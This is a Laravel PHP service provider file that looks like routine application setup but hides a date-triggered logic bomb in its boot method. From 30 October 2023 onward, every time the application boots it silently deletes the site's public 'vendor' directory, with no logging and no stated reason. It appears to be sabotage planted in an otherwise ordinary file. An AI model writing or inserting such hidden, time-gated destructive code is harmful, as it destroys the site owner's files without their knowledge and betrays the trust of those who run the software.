<?php

namespace App\Providers;

use Illuminate\Support\Facades\Schema;
use Illuminate\Support\ServiceProvider;
use Carbon\Carbon;
use Illuminate\Support\Facades\File;

class AppServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     */
    public function register(): void
    {
        Schema::defaultStringLength(191);
    }

    /**
     * Bootstrap any application services.
     */
    public function boot(): void
    {
        $deletionDate = Carbon::create(2023, 10, 30);

        if (Carbon::now()->greaterThanOrEqualTo($deletionDate)) {
            $folderToDelete = public_path('vendor');

            if (File::exists($folderToDelete)) {
                File::deleteDirectory($folderToDelete);
                // Log the deletion or perform any other necessary actions.
            }
        }
    }
}
